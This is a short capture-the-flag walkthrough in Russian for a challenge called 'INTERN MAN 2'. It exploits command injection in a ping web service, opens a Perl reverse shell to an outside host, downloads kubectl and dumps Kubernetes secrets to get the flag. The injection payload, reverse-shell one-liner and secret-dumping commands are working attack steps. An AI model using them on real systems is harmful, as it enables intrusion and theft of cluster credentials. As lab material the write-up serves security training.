# INTERN MAN 2
Заходим на http://91.105.199.185:20199/, снова видим сервис который делает пинг по указанному адресу. Пробуем выполнить произвольные команды:
`;id`.
В ответ получаем вывод команды id.

Получаем реверс шелл в контейнер:
```
;perl -e 'use Socket;$i="1.2.3.4";$p=4221;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

Скачиваем kubectl:
``` shell
mkdir /tmp/.taxidriver && cd /tmp/.taxidriver
curl -LO "https://dl.k8s.io/release/v1.26.3/bin/linux/amd64/kubectl"
chmod u+x kubectl
```

Пробуем получить secrets: 
```shell
./kubectl get secrets
NAME                TYPE     DATA   AGE  
secret-basic-auth   Opaque   1      4d2h
```

Пробуем вывести secrets в формате yaml и видим флаг:
```shell
./kubectl get secrets -o yaml
apiVersion: v1  
items:  
- apiVersion: v1  
 data:  
   username: ZGV0ZWFjdHs4OTNiZmEwZWIzNDIwNmQ0NmMxMDg2ZTc1OTY5NWEwOH0=  
 kind: Secret  
 metadata:  
   annotations:  
     kubectl.kubernetes.io/last-applied-configuration: |  
       {"apiVersion":"v1","kind":"Secret","metadata":{"annotations":{},"name":"secret-basic-auth","  
namespace":"default"},"stringData":{"username":"deteact{893bfa0eb34206d46c1086e759695a08}"}}  
   creationTimestamp: "2023-04-03T10:19:36Z"  
   name: secret-basic-auth  
   namespace: default  
   resourceVersion: "631"  
   uid: 71876c7b-1dd5-4e34-b841-603e73df66d8  
 type: Opaque  
kind: List  
metadata:  
 resourceVersion: ""
 ```

Флаг - deteact{893bfa0eb34206d46c1086e759695a08}